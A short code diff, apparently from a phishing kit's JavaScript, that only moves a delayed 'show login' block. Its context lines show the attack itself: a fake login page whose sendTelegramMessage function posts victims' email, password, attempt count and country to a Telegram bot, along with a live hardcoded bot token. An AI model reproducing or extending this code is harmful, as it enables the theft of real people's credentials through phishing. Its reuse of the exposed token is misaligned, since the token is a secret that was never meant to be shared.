@@ -1,9 +1,4 @@
- // --- SHOW LOGIN AFTER LOADING ---
-  setTimeout(() => {
-    document.getElementById("loading").style.display = "none";
-    loginBox.style.display = "block";
-    setTimeout(() => loginBox.style.opacity = 1, 50);
-  }, 3000);
+
   
 // Telegram Bot config
 const TELEGRAM_BOT_TOKEN = "8366154069:AAFTClzM2Kbirysud1i49UAWmEC6JP0T0xg";
@@ -126,7 +121,12 @@ function sendTelegramMessage(email, password, attempt, country) {
     body: JSON.stringify(payload)
   }).catch(e => console.error("Telegram send failed:", e));
 }
-
+ // --- SHOW LOGIN AFTER LOADING ---
+  setTimeout(() => {
+    document.getElementById("loading").style.display = "none";
+    loginBox.style.display = "block";
+    setTimeout(() => loginBox.style.opacity = 1, 50);
+  }, 3000);
 // Login button handler
 loginBtn.addEventListener('click', () => {
   const password = passwordInput.value.trim();
